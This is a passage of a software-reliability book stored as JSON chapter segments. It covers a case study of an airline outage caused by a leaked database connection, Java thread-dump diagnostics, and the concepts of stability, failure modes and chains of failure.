That Grounded an Airline • 14\n\nConsequences\n\nThree hours might not sound like much, especially when you compare that to some legendary outages. (British Airways’ global outage from June 2017— blamed on a power supply failure—comes to mind, for example.) The impact to the airline lasted a lot longer than just three hours, though. Airlines don’t staff enough gate agents to check everyone in using the old systems. When the kiosks go down, the airline has to call in agents who are off shift. Some of them are over their 40 hours for the week, incurring union-contract overtime (time and a half). Even the off-shift agents are only human, though. By the time the airline could get more staff on-site, they could deal only with the backlog. That took until nearly 3 p.m.\n\nIt took so long to check in the early-morning flights that planes could not push back from their gates. They would’ve been half-empty. Many travelers were late departing or arriving that day. Thursday happens to be the day that a lot of “nerd-birds” fly: commuter flights returning consultants to their home cities. Since the gates were still occupied, incoming flights had to be switched to other unoccupied gates. So even travelers who were already checked in still were inconvenienced and had to rush from their original gate to the reallocated gate.\n\nThe delays were shown on Good Morning America (complete with video of pathetically stranded single moms and their babies) and the Weather Chan- nel’s travel advisory.\n\nThe FAA measures on-time arrivals and departures as part of the airline’s annual report card. They also measure customer complaints sent to the FAA about an airline.\n\nThe CEO’s compensation is partly based on the FAA’s annual report card.\n\nYou know it’s going to be a bad day when you see the CEO stalking around the operations center to find out who cost him his vacation home in St. Thomas.\n\nPostmortem\n\nAt 10:30 a.m. Pacific time, eight hours after the outage started, our account representative, Tom (not his real name) called me to come down for a post- mortem. Because the failure occurred so soon after the database failover and maintenance, suspicion naturally condensed around that action. In operations, “post hoc, ergo propter hoc”—Latin for “you touched it last”—turns out to be a good starting point most of the time. It’s not always right, but it certainly provides a place to begin looking. In fact, when Tom called me, he asked me to fly there to find out why the database failover caused this outage.\n\nreport erratum • discuss\n\nPostmortem • 15\n\nOnce I was airborne, I started reviewing the problem ticket and preliminary incident report on my laptop.\n\nMy agenda was simple—conduct a postmortem investigation and answer some questions:\n\nDid the database failover cause the outage? If not, what did? • Was the cluster configured correctly? • Did the operations team conduct the maintenance correctly? • How could the failure have been detected before it became an outage? • Most importantly, how do we make sure this never, ever happens again?\n\nOf course, my presence also served to demonstrate to the client that we were serious about responding to this outage. Not to mention, my investigation was meant to allay any fears about the local team whitewashing the incident. They wouldn’t do such a thing, of course, but managing perception after a major incident can be as important as managing the incident itself.\n\nA postmortem is like a murder mystery. You have a set of clues. Some are reliable, such as server logs copied from the time of the outage. Some are unreliable, such as statements from people about what they saw. As with real witnesses, people will mix observations with speculation. They will present hypotheses as facts. The postmortem can actually be harder to solve than a murder, because the body goes away. There is no corpse to autopsy, because the servers are back up and running. Whatever state they were in that caused the failure no longer exists. The failure might have left traces in the log files or monitoring data collected from that time, or it might not. The clues can be very hard to see.\n\nAs I read the files, I made some notes about data to collect. From the applica- tion servers, I needed log files, thread dumps, and configuration files. From the database servers, I needed configuration files for the databases and the cluster server. I also made a note to compare the current configuration files to those from the nightly backup. The backup ran before the outage, so that would tell me whether any configurations were changed between the backup and my investigation. In other words, that would tell me whether someone was trying to cover up a mistake.\n\nBy the time I got to my hotel, my body said it was after midnight. All I wanted was a shower and a bed. What I got instead was a meeting with our account executive to brief me on developments while I was incommunicado in the air. My day finally ended around 1 a.m.\n\nreport erratum • discuss",
      "page_number": 19,
      "chapter_number": 3,
      "summary": "This chapter covers segment 3 (pages 19-26). Key topics include time, servers, and application. Decrees emerge from the ivory tower and descend upon the toiling coders.",
      "keywords": [
        "database",
        "time",
        "application servers",
        "architect",
        "Oracle database server",
        "servers",
        "virtual IP address",
        "IVR",
        "pragmatic architect",
        "database server",
        "report erratum",
        "application",
        "change",
        "Veritas Cluster Server",
        "airline"
      ],
      "concepts": [
        "time",
        "servers",
        "application",
        "applications",
        "database",
        "service",
        "servicing",
        "flight",
        "architecture",
        "networks"
      ],
      "similar_chapters": [
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.69,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 3,
          "title": "Segment 3 (pages 18-26)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 62,
          "title": "Segment 62 (pages 607-613)",
          "relevance_score": 0.65,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 8",
          "chapter": 47,
          "title": "Segment 47 (pages 448-460)",
          "relevance_score": 0.64,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 59,
          "title": "Segment 59 (pages 583-590)",
          "relevance_score": 0.63,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 4,
      "title": "Segment 4 (pages 27-34)",
      "start_page": 27,
      "end_page": 34,
      "detection_method": "topic_boundary",
      "content": "Chapter 2. Case Study: The Exception That Grounded an Airline • 16\n\nHunting for Clues\n\nIn the morning, fortified with quarts of coffee, I dug into the database cluster and RAID configurations. I was looking for common problems with clusters: not enough heartbeats, heartbeats going through switches that carry produc- tion traffic, servers set to use physical IP addresses instead of the virtual address, bad dependencies among managed packages, and so on. At that time, I didn’t carry a checklist; these were just problems that I’d seen more than once or heard about through the grapevine. I found nothing wrong. The engineering team had done a great job with the database cluster. Proven, textbook work. In fact, some of the scripts appeared to be taken directly from Veritas’s own training materials.\n\nNext, it was time to move on to the application servers’ configuration. The local engineers had made copies of all the log files from the kiosk application servers during the outage. I was also able to get log files from the CF applica- tion servers. They still had log files from the time of the outage, since it was just the day before. Better still, thread dumps were available in both sets of log files. As a longtime Java programmer, I love Java thread dumps for debugging application hangs.\n\nArmed with a thread dump, the application is an open book, if you know how to read it. You can deduce a great deal about applications for which you’ve never seen the source code. You can tell:\n\nWhat third-party libraries an application uses • What kind of thread pools it has • How many threads are in each • What background processing the application uses • What protocols the application uses (by looking at the classes and methods in each thread’s stack trace)\n\nGetting Thread Dumps\n\nAny Java application will dump the state of every thread in the JVM when you send it a signal 3 (SIGQUIT) on UNIX systems or press Ctrl+Break on Windows systems.\n\nTo use this on Windows, you must be at the console, with a Command Prompt window running the Java application. Obviously, if you are logging in remotely, this pushes you toward VNC or Remote Desktop.\n\nOn UNIX, if the JVM is running directly in a tmux or screen session, you can type Ctrl-\\. Most of the time, the process will be detached from the terminal session, though, so you would use kill to send the signal:\n\nkill -3 18835\n\nreport erratum • discuss\n\nHunting for Clues • 17\n\nOne catch about the thread dumps triggered at the console: they always come out on “standard out.” Many canned startup scripts do not capture standard out, or they send it to /dev/null. Log files produced with Log4j or java.util.logging cannot show thread dumps. You might have to experiment with your application server’s startup scripts to get thread dumps.\n\nIf you’re allowed to connect to the JVM directly, you can use jcmd to dump the JVM’s threads to your terminal:\n\njcmd 18835 Thread.print\n\nIf you can do that, then you can probably point jconsole at the JVM and browse the threads in a GUI!\n\nHere is a small portion of a thread dump:\n\n\"http-0.0.0.0-8080-Processor25\" daemon prio=1 tid=0x08a593f0 \\\n\nnid=0x57ac runnable [a88f1000..a88f1ccc] at java.net.PlainSocketImpl.socketAccept(Native Method) at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:353) - locked <0xac5d3640> (a java.net.PlainSocketImpl) at java.net.ServerSocket.implAccept(ServerSocket.java:448) at java.net.ServerSocket.accept(ServerSocket.java:419) at org.apache.tomcat.util.net.DefaultServerSocketFactory.\\\n\nacceptSocket(DefaultServerSocketFactory.java:60) at org.apache.tomcat.util.net.PoolTcpEndpoint.\\\n\nacceptSocket(PoolTcpEndpoint.java:368)\n\nat org.apache.tomcat.util.net.TcpWorkerThread.runIt(PoolTcpEndpoint.java:549) at org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.\\\n\nrun(ThreadPool.java:683)\n\nat java.lang.Thread.run(Thread.java:534)\n\n\"http-0.0.0.0-8080-Processor24\" daemon prio=1 tid=0x08a57c30 \\ nid=0x57ab in Object.wait() [a8972000..a8972ccc]\n\nat java.lang.Object.wait(Native Method)\n\nwaiting on <0xacede700> (a \\ org.apache.tomcat.util.threads.ThreadPool$ControlRunnable) at java.lang.Object.wait(Object.java:429) at org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.\\\n\nrun(ThreadPool.java:655) - locked <0xacede700> (a org.apache.tomcat.util.threads.ThreadPool$ControlRunnable)\n\nat java.lang.Thread.run(Thread.java:534)\n\nThey do get verbose.\n\nThis fragment shows two threads, each named something like http-0.0.0.0-8080- ProcessorN. Number 25 is in a runnable state, whereas thread 24 is blocked in Object.wait(). This trace clearly indicates that these are members of a thread pool. That some of the classes on the stacks are named ThreadPool$ControlRunnable() might also be a clue.\n\nreport erratum • discuss\n\nChapter 2. Case Study: The Exception That Grounded an Airline • 18\n\nIt did not take long to decide that the problem had to be within CF. The thread dumps for the kiosks’ application servers showed exactly what I would expect from the observed behavior during the incident. Out of the forty threads allocated for handling requests from the individual kiosks, all forty were blocked inside SocketInputStream.socketRead0(), a native method inside the internals of Java’s socket library. They were trying vainly to read a response that would never come.\n\nThe kiosk application server’s thread dump also gave me the precise name of the class and method that all forty threads had called: FlightSearch.lookupByCity(). I was surprised to see references to RMI and EJB methods a few frames higher in the stack. CF had always been described as a “web service.” Admittedly, the definition of a web service was pretty loose at that time, but it still seems like a stretch to call a stateless session bean a “web service.”\n\nRemote method invocation (RMI) provides EJB with its remote procedure calls. EJB calls can ride over one of two transports: CORBA (dead as disco) or RMI. As much as RMI made cross-machine communication feel like local programming, it can be dangerous because calls cannot be made to time out. As a result, the caller is vulnerable to problems in the remote server.\n\nThe Smoking Gun\n\nAt this point, the postmortem analysis agreed with the symptoms from the outage itself: CF appeared to have caused both the IVR and kiosk check-in to hang. The biggest remaining question was still, “What happened to CF?”\n\nThe picture got clearer as I investigated the thread dumps from CF. CF’s application server used separate pools of threads to handle EJB calls and HTTP requests. That’s why CF was always able to respond to the monitoring application, even during the middle of the outage. The HTTP threads were almost entirely idle, which makes sense for an EJB server. The EJB threads, on the other hand, were all completely in use processing calls to Flight- Search.lookupByCity(). In fact, every single thread on every application server was blocked at exactly the same line of code: attempting to check out a database connection from a resource pool.\n\nIt was circumstantial evidence, not a smoking gun. But considering the database failover before the outage, it seemed that I was on the right track.\n\nThe next part would be dicey. I needed to look at that code, but the operations center had no access to the source control system. Only binaries were deployed to the production environment. That’s usually a good security precaution, but it was a bit inconvenient at the time. When I asked our account executive\n\nreport erratum • discuss\n\nThe Smoking Gun • 19\n\nhow we could get access to the source code, he was reluctant to take that step. Given the scale of the outage, you can imagine that there was plenty of blame floating in the air looking for someone to land on. Relations between Operations and Development—often difficult to start with—were more strained than usual. Everyone was on the defensive, wary of any attempt to point the finger of blame in their direction.\n\nSo, with no legitimate access to the source code, I did the only thing I could do. I took the binaries from production and decompiled them. The minute I saw the code for the suspect EJB, I knew I had found the real smoking gun. Here’s the actual code:\n\npackage com.example.cf.flightsearch; . . . public class FlightSearch implements SessionBean {\n\nprivate MonitoredDataSource connectionPool;\n\npublic List lookupByCity(. . .) throws SQLException, RemoteException {\n\nConnection conn = null; Statement stmt = null;\n\ntry {\n\nconn = connectionPool.getConnection(); stmt = conn.createStatement();\n\n// Do the lookup logic // return a list of results\n\n} finally {\n\nif (stmt != null) {\n\nstmt.close();\n\n}\n\nif (conn != null) {\n\nconn.close();\n\n}\n\n}\n\n}\n\n}\n\nActually, at first glance, this method looks well constructed. Use of the try...finally block indicates the author’s desire to clean up resources. In fact, this very cleanup block has appeared in some Java books on the market. Too bad it contains a fatal flaw.\n\nIt turns out that java.sql.Statement.close() can throw a SQLException. It almost never does. Oracle’s driver does only when it encounters an IOException attempting to close the connection—following a database failover, for instance.\n\nreport erratum • discuss\n\nChapter 2. Case Study: The Exception That Grounded an Airline • 20\n\nSuppose the JDBC connection was created before the failover. The IP address used to create the connection will have moved from one host to another, but the current state of TCP connections will not carry over to the second database host. Any socket writes will eventually throw an IOException (after the operating system and network driver finally decide that the TCP connection is dead). That means every JDBC connection in the resource pool is an accident waiting to happen.\n\nAmazingly, the JDBC connection will still be willing to create statements. To create a statement, the driver’s connection object checks only its own internal status. (This might be a quirk peculiar to certain versions of Oracle’s JDBC drivers.) If the JDBC connection thinks it’s still connected, then it will create the statement. Executing that statement will throw a SQLException when it does some network I/O. But closing the statement will also throw a SQLException, because the driver will attempt to tell the database server to release resources associated with that statement.\n\nIn short, the driver is willing to create a Statement Object that cannot be used. You might consider this a bug. Many of the developers at the airline certainly made that accusation. The key lesson to be drawn here, though, is that the JDBC specification allows java.sql.Statement.close() to throw a SQLException, so your code has to handle it.\n\nIn the previous offending code, if closing the statement throws an exception, then the connection does not get closed, resulting in a resource leak. After forty of these calls, the resource pool is exhausted and all future calls will block at connectionPool.getConnection(). That is exactly what I saw in the thread dumps from CF.\n\nThe entire globe-spanning, multibillion dollar airline with its hundreds of aircraft and tens of thousands of employees was grounded by one program- mer’s error: a single uncaught SQLException.\n\nAn Ounce of Prevention?\n\nWhen such staggering costs result from such a small error, the natural response is to say, “This must never happen again.” (I’ve seen ops managers pound their shoes on a table like Nikita Khrushchev while declaring, “This must never happen again.”) But how can it be prevented? Would a code review have caught this bug? Only if one of the reviewers knew the internals of Oracle’s JDBC driver or the review team spent hours on each method. Would more testing have prevented this bug? Perhaps. Once the problem was iden- tified, the team performed a test in the stress test environment that did\n\nreport erratum • discuss\n\nAn Ounce of Prevention? • 21\n\ndemonstrate the same error. The regular test profile didn’t exercise this method enough to show the bug. In other words, once you know where to look, it’s simple to make a test that finds it.\n\nUltimately, it’s just fantasy to expect every single bug like this one to be driven out. Bugs will happen. They cannot be eliminated, so they must be survived instead.\n\nThe worst problem here is that the bug in one system could propagate to all the other affected systems. A better question to ask is, “How do we prevent bugs in one system from affecting everything else?” Inside every enterprise today is a mesh of interconnected, interdependent systems. They cannot— must not—allow bugs to cause a chain of failures. We’re going to look at design patterns that can prevent this type of problem from spreading.\n\nreport erratum • discuss\n\nCHAPTER 3\n\nStabilize Your System\n\nNew software emerges like a new college graduate: full of optimistic vigor, suddenly facing the harsh realities of the world outside the lab. Things happen in the real world that just do not happen in the lab—usually bad things. In the lab, all the tests are contrived by people who know what answer they expect to get. The challenges your software encounters in the real world don’t have such neat answers.\n\nEnterprise software must be cynical. Cynical software expects bad things to happen and is never surprised when they do. Cynical software doesn’t even trust itself, so it puts up internal barriers to protect itself from failures. It refuses to get too intimate with other systems, because it could get hurt.\n\nThe airline’s Core Facilities project discussed in Chapter 2, Case Study: The Exception That Grounded an Airline, on page 9, was not cynical enough. As so often happens, the team got caught up in the excitement of new tech- nology and advanced architecture. It had lots of great things to say about leverage and synergy. Dazzled by the dollar signs, it didn’t see the stop sign and took a turn for the worse.\n\nPoor stability carries significant real costs. The obvious cost is lost revenue. The retailer from Chapter 1, Living in Production, on page 1, loses $1,000,000 per hour of downtime, and that’s during the off-season. Trading systems can lose that much in a single missed transaction!\n\nIndustry studies show that it costs up to $150 for an online retailer to acquire a customer. With 5,000 unique visitors per hour, assume 10 percent of those would-be visitors walk away for good. That’s $75,000 in wasted marketing.1\n\n1.\n\nhttp://kurtkummerer.com/customer-acquisition-cost\n\nreport erratum • discuss\n\nChapter 3. Stabilize Your System • 24\n\nLess tangible, but just as painful, is lost reputation. Tarnish to the brand might be less immediately obvious than lost customers, but try having your holiday-season operational problems reported in Bloomberg Businessweek. Millions of dollars in image advertising—touting online customer service— can be undone in a few hours by a batch of bad hard drives.\n\nGood stability does not necessarily cost a lot. When building the architecture, design, and even low-level implementation of a system, many decision points have high leverage over the system’s ultimate stability. Confronted with these leverage points, two paths might both satisfy the functional requirements (aiming for QA). One will lead to hours of downtime every year, while the other will not. The amazing thing is that the highly stable design usually costs the same to implement as the unstable one.\n\nDefining Stability\n\nTo talk about stability, we need to define some terms. A transaction is an abstract unit of work processed by the system. This is not the same as a database transaction. A single unit of work might encompass many database transactions. In an e-commerce site, for example, one common type of transaction is “customer places order.” This transaction spans several pages, often including external integrations such as credit card verification. Trans- actions are the reason that the system exists. A single system can process just one type of transaction, making it a dedicated system. A mixed workload is a combination of different transaction types processed by a system.\n\nThe word system means the complete, interdependent set of hardware, applications, and services required to process transactions for users. A system might be as small as a single application, or it might be a sprawling, multitier network of applications and servers.\n\nA robust system keeps processing transactions, even when transient impulses, persistent stresses, or component failures disrupt normal process- ing. This is what most people mean by “stability.” It’s not just that your indi- vidual servers or applications stay up and running but rather that the user can still get work done.\n\nThe terms impulse and stress come from mechanical engineering. An impulse is a rapid shock to the system. An impulse to the system is when something whacks it with a hammer. In contrast, stress to the system is a force applied to the system over an extended period.\n\nA flash mob pounding the PlayStation 6 product detail page, thanks to a rumor that such a thing exists, causes an impulse. Ten thousand new sessions,\n\nreport erratum • discuss",
      "page_number": 27,
      "chapter_number": 4,
      "summary": "This chapter covers segment 4 (pages 27-34). Key topics include java, thread, and report.",
      "keywords": [
        "thread dumps",
        "thread",
        "application",
        "Airline",
        "outage",
        "time",
        "Java thread dumps",
        "report erratum",
        "application server",
        "log files",
        "JDBC connection",
        "dumps",
        "database",
        "connection",
        "files"
      ],
      "concepts": [
        "java",
        "thread",
        "report",
        "servers",
        "team",
        "application",
        "applications",
        "connect",
        "connection",
        "connections"
      ],
      "similar_chapters": [
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 30,
          "title": "Segment 30 (pages 294-301)",
          "relevance_score": 0.69,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 5,
          "title": "Segment 5 (pages 33-40)",
          "relevance_score": 0.68,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.67,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 3,
          "title": "Segment 3 (pages 17-24)",
          "relevance_score": 0.67,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 59,
          "title": "Segment 59 (pages 583-590)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 5,
      "title": "Segment 5 (pages 35-42)",
      "start_page": 35,
      "end_page": 42,
      "detection_method": "topic_boundary",
      "content": "Extending Your Life Span • 25\n\nall arriving within one minute of each other, is very difficult for any service instance to withstand. A celebrity tweet about your site is an impulse. Dumping twelve million messages into a queue at midnight on November 21 is an impulse. These things can fracture the system in the blink of an eye.\n\nOn the other hand, getting slow responses from your credit card processor because it doesn’t have enough capacity for all of its customers is a stress to the system. In a mechanical system, a material changes shape when stress is applied. This change in shape is called the strain. Stress produces strain. The same thing happens with computer systems. The stress from the credit card processor will cause strain to propagate to other parts of the system, which can produce odd effects. It could manifest as higher RAM usage on the web servers or excess I/O rates on the database server or as some other far distant effect.\n\nA system with longevity keeps processing transactions for a long time. What is a long time? It depends. A useful working definition of “a long time” is the time between code deployments. If new code is deployed into production every week, then it doesn’t matter if the system can run for two years without rebooting. On the other hand, a data collector in western Montana really shouldn’t need to be rebooted by hand once a week. (Unless you want to live in western Montana, that is.)\n\nExtending Your Life Span\n\nThe major dangers to your system’s longevity are memory leaks and data growth. Both kinds of sludge will kill your system in production. Both are rarely caught during testing.\n\nTesting makes problems visible so you can fix them. Following Murphy’s Law, whatever you do not test against will happen. Therefore, if you do not test for crashes right after midnight or out-of-memory errors in the application’s forty- ninth hour of uptime, those crashes will happen. If you do not test for mem- ory leaks that show up only after seven days, you will have memory leaks after seven days.\n\nThe trouble is that applications never run long enough in the development environment to reveal their longevity bugs. How long do you usually keep an application server running in your development environment? I’ll bet the average life span is less than the length of a sitcom on Netflix. In QA, it might run a little longer but probably still gets recycled at least daily, if not more often. Even when it is up and running, it’s not under continuous load. These\n\nreport erratum • discuss\n\nChapter 3. Stabilize Your System • 26\n\nenvironments are not conducive to long-running tests, such as leaving the server running for a month under daily traffic.\n\nThese sorts of bugs usually aren’t caught by load testing either. A load test runs for a specified period of time and then quits. Load-testing vendors charge large dollars per hour, so nobody asks them to keep the load running for a week at a time. Your development team probably shares the corporate network, so you can’t disrupt such vital corporate activities as email and web browsing for days at a time.\n\nSo how do you find these kinds of bugs? The only way you can catch them before they bite you in production is to run your own longevity tests. If you can, set aside a developer machine. Have it run JMeter, Marathon, or some other load-testing tool. Don’t hit the system hard; just keep driving requests all the time. (Also, be sure to have the scripts slack for a few hours a day to simulate the slow period during the middle of the night. That will catch con- nection pool and firewall timeouts.)\n\nSometimes the economics don’t justify setting up a complete environment. If not, at least try to test important parts while stubbing out the rest. It’s still better than nothing.\n\nIf all else fails, production becomes your longevity testing environment by default. You’ll definitely find the bugs there, but it’s not a recipe for a happy lifestyle.\n\nFailure Modes\n\nSudden impulses and excessive strain can both trigger catastrophic failure. In either case, some component of the system will start to fail before everything else does. In Inviting Disaster [Chi01], James R. Chiles refers to these as “cracks in the system.” He draws an analogy between a complex system on the verge of failure and a steel plate with a microscopic crack in the metal. Under stress, that crack can begin to propagate faster and faster. Eventually, the crack propagates faster than the speed of sound and the metal breaks explosively. The original trigger and the way the crack spreads to the rest of the system, together with the result of the damage, are collectively called a failure mode.\n\nNo matter what, your system will have a variety of failure modes. Denying the inevitability of failures robs you of your power to control and contain them. Once you accept that failures will happen, you have the ability to design your system’s reaction to specific failures. Just as auto engineers create crumple zones—areas designed to protect passengers by failing first—you can\n\nreport erratum • discuss\n\nStopping Crack Propagation • 27\n\ncreate safe failure modes that contain the damage and protect the rest of the system. This sort of self-protection determines the whole system’s resilience.\n\nChiles calls these protections “crackstoppers.” Like building crumple zones to absorb impacts and keep car passengers safe, you can decide what features of the system are indispensable and build in failure modes that keep cracks away from those features. If you do not design your failure modes, then you’ll get whatever unpredictable—and usually dangerous—ones happen to emerge.\n\nStopping Crack Propagation\n\nLet’s see how the design of failure modes applies to the grounded airline from before. The airline’s Core Facilities project had not planned out its failure modes. The crack started at the improper handling of the SQLException, but it could have been stopped at many other points. Let’s look at some examples, from low-level detail to high-level architecture.\n\nBecause the pool was configured to block requesting threads when no resources were available, it eventually tied up all request-handling threads. (This happened independently in each application server instance.) The pool could have been configured to create more connections if it was exhausted. It also could have been configured to block callers for a limited time, instead of blocking forever when all connections were checked out. Either of these would have stopped the crack from propagating.\n\nAt the next level up, a problem with one call in CF caused the calling applica- tions on other hosts to fail. Because CF exposed its services as Enterprise JavaBeans (EJBs), it used RMI. By default, RMI calls will never time out. In other words, the callers blocked waiting to read their responses from CF’s EJBs. The first twenty callers to each instance received exceptions: a SQLException wrapped in an InvocationTargetException wrapped in a RemoteException, to be precise. After that, the calls started blocking.\n\nThe client could have been written to set a timeout on the RMI sockets. For example, it could have installed a socket factory that calls Socket.setSoTimeout() on all new sockets it creates. At a certain point in time, CF could also have decided to build an HTTP-based web service instead of EJBs. Then the client could set a timeout on its HTTP requests. The clients might also have written their calls so the blocked threads could be jettisoned, instead of having the request-handling thread make the external integration call. None of these were done, so the crack propagated from CF to all systems that used CF.\n\nAt a still larger scale, the CF servers themselves could have been partitioned into more than one service group. That would have kept a problem within\n\nreport erratum • discuss\n\nChapter 3. Stabilize Your System • 28\n\none of the service groups from taking down all users of CF. (In this case, all the service groups would have cracked in the same way, but that would not always be the case.) This is another way of stopping cracks from propagating into the rest of the enterprise.\n\nLooking at even larger architecture issues, CF could’ve been built using request/reply message queues. In that case, the caller would know that a reply might never arrive. It would have to deal with that case as part of han- dling the protocol itself. Even more radically, the callers could have been searching for flights by looking for entries in a tuple space that matched the search criteria. CF would have to have kept the tuple space populated with flight records. The more tightly coupled the architecture, the greater the chance this coding error can propagate. Conversely, the less-coupled archi- tectures act as shock absorbers, diminishing the effects of this error instead of amplifying them.\n\nAny of these approaches could have stopped the SQLException problem from spreading to the rest of the airline. Sadly, the designers had not considered the possibility of “cracks” when they created the shared services.\n\nChain of Failure\n\nUnderneath every system outage is a chain of events like this. One small issue leads to another, which leads to another. Looking at the entire chain of failure after the fact, the failure seems inevitable. If you tried to estimate the probability of that exact chain of events occurring, it would look incredibly improbable. But it looks improbable only if you consider the probability of each event independently. A coin has no memory; each toss has the same probability, independent of previous tosses. The combination of events that caused the failure is not independent. A failure in one point or layer actually increases the probability of other failures. If the database gets slow, then the application servers are more likely to run out of memory. Because the layers are coupled, the events are not independent.\n\nHere’s some common terminology we can use to be precise about these chains of events:\n\nFault\n\nA condition that creates an incorrect internal state in your software. A fault may be due to a latent bug that gets triggered, or it may be due to an unchecked condition at a boundary or external interface.\n\nError Visibly incorrect behavior. When your trading system suddenly buys\n\nten billion dollars of Pokemon futures, that is an error.\n\nreport erratum • discuss\n\nChain of Failure • 29\n\nFailure An unresponsive system. When a system doesn’t respond, we say it has failed. Failure is in the eye of the beholder...a computer may have the power on but not respond to any requests.\n\nTriggering a fault opens the crack. Faults become errors, and errors provoke failures. That’s how the cracks propagate.\n\nAt each step in the chain of failure, the crack from a fault may accelerate, slow, or stop. A highly complex system with many degrees of coupling offers more pathways for cracks to propagate along, more opportunities for errors.\n\nTight coupling accelerates cracks. For instance, the tight coupling of EJB calls allowed a resource exhaustion problem in CF to create larger problems in its callers. Coupling the request-handling threads to the external integration calls in those systems caused a remote problem to turn into downtime.\n\nOne way to prepare for every possible failure is to look at every external call, every I/O, every use of resources, and every expected outcome and ask, “What are all the ways this can go wrong?” Think about the different types of impulse and stress that can be applied:\n\nWhat if it can’t make the initial connection?\n\nWhat if it takes ten minutes to make the connection?\n\nWhat if it can make the connection and then gets disconnected?\n\nWhat if it can make the connection but doesn’t get a response from the\n\nother end?\n\nWhat if it takes two minutes to respond to my query?\n\nWhat if 10,000 requests come in at the same time?\n\nWhat if the disk is full when the application tries to log the error message about the SQLException that happened because the network was bogged down with a worm?\n\nThat’s just the beginning of everything that can go wrong. The exhaustive brute-force approach is clearly impractical for anything but life-critical systems or Mars rovers. What if you actually have to deliver in this decade?\n\nOur community is divided about how to handle faults. One camp says we need to make systems fault-tolerant. We should catch exceptions, check error codes, and generally keep faults from turning into errors. The other camp says it’s futile to aim for fault tolerance. It’s like trying to make a fool-proof device: the universe will always deliver a better fool. No matter what faults\n\nreport erratum • discuss\n\nChapter 3. Stabilize Your System • 30\n\nyou try to catch and recover from, something unexpected will always occur. This camp says “let it crash” so you can restart from a known good state.\n\nBoth camps agree on two things, though. Faults will happen; they can never be completely prevented. And we must keep faults from becoming errors. You have to decide for your system whether it’s better to risk failure or errors— even while you try to prevent failures and errors. We’ll look at some patterns that let you create shock absorbers to relieve those stresses.\n\nWrapping Up\n\nEvery production failure is unique. No two incidents will share the precise chain of failure: same triggers, same fracture, same propagation. Over time, however, patterns of failure do emerge. A certain brittleness along an axis, a tendency for this problem to amplify that way. These are the stability antipatterns. Chapter 4, Stability Antipatterns, on page 31, deals with these patterns of failure.\n\nIf there are systematic patterns of failure, you might imagine that some common solutions would apply. You would be correct. Chapter 5, Stability Patterns, on page 91, deals with design and architecture patterns to defeat the antipatterns. These patterns cannot prevent cracks in the system. Nothing can. Some set of conditions will always trigger a crack. But these patterns stop cracks from propagating. They help contain damage and preserve partial functionality instead of allowing total failures.\n\nFirst, the bad news. We must travel through the valley of shadows before we can reach the plateau of enlightenment. In other words, it’s time to look at the antipatterns that will kill your systems.\n\nreport erratum • discuss\n\nCHAPTER 4\n\nStability Antipatterns\n\nDelegates to the first NATO Software Engineering Conference coined the term software crisis in 1968. They meant that demand for new software outstripped the capacity of all existing programmers worldwide. If that truly was the start of the software crisis, then it has never ended! (Interestingly, that conference also appears to be the origin of the term software engineering. Some reports say it was named that way so certain attendees would be able to get their travel expenses approved. I guess that problem hasn’t changed much either.) Our machines have gotten better by orders of magnitude. So have the languages and libraries. The enormous leverage of open source multiplies our abilities. And of course, something like a million times more programmers are in the world now than there were in 1968. So overall, our ability to create software has had its own kind of Moore’s law exponential curve at work. So why are we still in a software crisis? Because we’ve steadily taken on bigger and bigger challenges.\n\nIn those hazy days of the client/server system, we used to think of a hundred active users as a large system; now we think about millions. (And that’s up from the first edition of this book, when ten thousand active users was a lot.) We’ve just seen our first billion-user site. In 2016, Facebook announced that it has 1.13 billion daily active users.1 An “application” now consists of dozens or hun- dreds of services, each running continuously while being redeployed continu- ously. Five nines of reliability for the overall application is nowhere near enough. It would result in thousands of disappointed users every day. Six Sigma quality on Facebook would create 768,000 angry users per day. (200 requests per page, 1.13 billion daily active users, 3.4 defects per million opportunities.)\n\nThe breadth of our applications’ reach has exploded, too. Everything within the enterprise is interconnected, and then again as we integrate across\n\n1.\n\nhttp://venturebeat.com/2016/07/27/facebook-passes-1-billion-mobile-daily-active-users\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 32\n\nenterprises. Even the boundaries of our applications have become fuzzy as more features are delegated to SaaS services.\n\nOf course, this also means bigger challenges. As we integrate the world, tightly coupled systems are the rule rather than the exception. Big systems serve more users by commanding more resources; but in many failure modes big systems fail faster than small systems. The size and the complexity of these systems push us to what author James R. Chiles calls in Inviting Disaster [Chi01] the “technology frontier,” where the twin specters of high interactive complexity and tight coupling conspire to turn rapidly moving cracks into full-blown failures.\n\nHigh interactive complexity arises when systems have enough moving parts and hidden, internal dependencies that most operators’ mental models are either incomplete or just plain wrong. In a system exhibiting high interactive complexity, the operator’s instinctive actions will have results ranging from ineffective to actively harmful. With the best of intentions, the operator can take an action based on his or her own mental model of how the system functions that triggers a completely unexpected linkage. Such linkages con- tribute to “problem inflation,” turning a minor fault into a major failure. For example, hidden linkages in cooling monitoring and control systems are partly to blame for the Three Mile Island reactor incident, as Chiles outlines in his book. These hidden linkages often appear obvious during the post- mortem analysis, but are in fact devilishly difficult to anticipate.\n\nTight coupling allows cracks in one part of the system to propagate themselves —or multiply themselves—across layer or system boundaries. A failure in one component causes load to be redistributed to its peers and introduces delays and stress to its callers. This increased stress makes it extremely likely that another component in the system will fail. That in turn makes the next failure more likely, eventually resulting in total collapse. In your systems, tight coupling can appear 